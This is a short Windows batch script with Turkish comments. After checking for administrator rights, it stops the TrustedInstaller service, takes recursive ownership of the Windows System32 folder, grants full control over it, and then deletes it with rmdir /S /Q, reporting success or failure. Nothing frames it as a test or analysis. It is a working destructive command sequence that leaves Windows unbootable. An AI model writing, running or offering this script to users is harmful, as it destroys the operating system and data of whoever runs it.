@echo off
setlocal EnableDelayedExpansion

:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Bu script'in yonetici olarak calistirilmasi gerekiyor.
    echo Lutfen script'e sag tiklayin ve "Yonetici olarak calistir" secenegini secin.
    pause
    exit /B 1
)

:: Klasör yolunu belirle
set "folderPath=%windir%\System32"

echo 1

:: TrustedInstaller servisini durdur
net stop TrustedInstaller

:: Sahipliği al
takeown /F "%folderPath%" /A /R /D Y

:: Yetkileri değiştir
icacls "%folderPath%" /grant administrators:F /T
icacls "%folderPath%" /grant "%username%":F /T

:: Klasörü sil
rmdir /S /Q "%folderPath%"

if exist "%folderPath%" (
    echo Teneke silinemedi. Lutfen manuel olarak silmeyi deneyin.
) else (
    echo Teneke basariyla silindi.
)

echo Islem tamamlandi.
pause
